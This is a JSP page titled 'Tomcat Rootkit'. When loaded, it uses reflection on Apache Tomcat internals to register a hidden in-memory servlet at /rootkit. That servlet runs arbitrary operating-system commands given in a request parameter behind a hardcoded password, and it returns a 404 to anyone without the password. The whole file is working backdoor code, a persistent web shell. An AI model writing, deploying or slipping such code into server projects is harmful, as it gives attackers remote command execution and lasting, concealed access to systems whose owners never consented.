<%@ page language="java" contentType="text/html; charset=UTF-8"
    pageEncoding="UTF-8"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<title>Tomcat Rootkit</title>
</head>
<body>
	Tomcat Rootkit...<br/>
</body>
<%
	ServletContext applicationContextFacade = request.getServletContext();
	java.lang.reflect.Field f1 = applicationContextFacade.getClass().getDeclaredField("context");
	f1.setAccessible(true);
	Object applicationContext = f1.get(applicationContextFacade);
	java.lang.reflect.Field f2 = applicationContext.getClass().getDeclaredField("context");
	f2.setAccessible(true);
	org.apache.catalina.core.StandardContext servletContext = (org.apache.catalina.core.StandardContext)f2.get(applicationContext);
	
	java.lang.reflect.Field f3 = org.apache.catalina.core.ContainerBase.class.getDeclaredField("children");
	f3.setAccessible(true);
	java.util.HashMap<String, org.apache.catalina.Container> children = (java.util.HashMap<String, org.apache.catalina.Container>)f3.get(servletContext);

	
	String rootkitName = "tomcatrootkit";
	String rootkitPath = "/rootkit";
	
	if(children.containsKey(rootkitName)){
		children.remove(rootkitName);
		out.print("remove old rootkit...<br/>");
	}
	
	Servlet s = new HttpServlet(){
		protected void doGet(HttpServletRequest req, HttpServletResponse res) throws ServletException, java.io.IOException {
			String pass = req.getParameter("pass");
			if("123123".equals(pass)){
				String cmd = req.getParameter("cmd") == null ? "whoami" : req.getParameter("cmd");
				StringBuffer sb = new StringBuffer();
				try{
					java.io.BufferedReader br = new java.io.BufferedReader(new java.io.InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream(),"GBK"));
					String line = null;
					while((line = br.readLine()) != null){
						sb.append(line + "<br/>");
					}
					res.setContentType("text/html;charset=GBK");
					res.getWriter().print(sb.toString());
				}catch(Exception e){}
			}else{
				res.sendError(404,req.getContextPath() + req.getServletPath());
			}
		}
	};
	
	//org.apache.catalina.deploy.ServletDef sd = new org.apache.catalina.deploy.ServletDef();
	//sd.setServletClass(s.getClass().getName());
	//sd.setServletName(rootkitName);
	
	org.apache.catalina.Wrapper wrapper = servletContext.createWrapper();
	wrapper.setName(rootkitName);
	wrapper.setServletClass(s.getClass().getName());
	wrapper.setServlet(s);
	
	servletContext.addChild(wrapper);
	servletContext.addServletMapping(rootkitPath, rootkitName);
	
	out.print("Tomcat Rootkit deploy success...");
%>
</html>